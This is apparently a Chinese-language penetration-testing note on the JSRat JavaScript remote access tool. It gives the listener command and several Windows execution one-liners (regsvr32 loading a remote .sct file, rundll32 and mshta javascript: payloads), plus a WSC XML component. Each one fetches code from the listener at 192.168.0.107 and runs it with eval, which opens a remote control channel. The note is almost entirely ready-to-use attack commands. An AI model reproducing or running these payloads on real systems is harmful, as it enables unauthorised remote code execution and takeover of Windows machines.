	https://github.com/Hood3dRob1n/JSRat-Py
	https://github.com/Ridter/MyJSRat
	启动
	>python JSRat.py -i 192.168.0.107 -p 1234
	MyJSRat可以-c参数指定执行的命令
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/247.png)

	/connect是回连地址，/wtf是执行代码
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/248.png)

	直接在靶机执行
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/249.png)

	或
	>regsvr32.exe /u /n /s /i:http://192.168.0.107:1234/file.sct scrobj.dll
	JSRat显示上线
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/250.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/251.png)

	Wsc方式
```xml
<?xml version="1.0"?>
<package>
<component id="testCalc">
<script language="JScript">
<![CDATA[
        rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try{v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);}catch(e){}h.Open(\"GET\",\"http://192.168.0.107:1234/connect\",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}";
        new ActiveXObject("WScript.Shell").Run(rat,0,true);
]]>
</script>
</component>
</package>

```
	>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://192.168.0.107/jsrat.wsc")
	Mshta方式
	>mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.0.107:1234/connect",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);}
